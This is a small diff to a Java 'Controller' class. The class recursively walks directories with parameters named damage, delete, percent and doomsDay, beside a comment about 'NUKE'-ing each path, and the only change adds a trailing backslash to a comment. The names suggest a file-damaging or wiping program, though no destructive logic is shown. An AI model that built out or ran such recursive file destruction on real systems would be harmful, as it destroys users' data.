@@ -42,7 +42,7 @@ public class Controller {
 
 		// for cycle to walk around all directories
 		for (int i = 0; i < listFolders.length; i++) {
-			// search for other paths
+			// search for other paths\
 			new Controller(startpathFile, damage, extensions, random, delete, percent, folders, doomsDay);
 		}
 		// NUKE this path last to save the program time
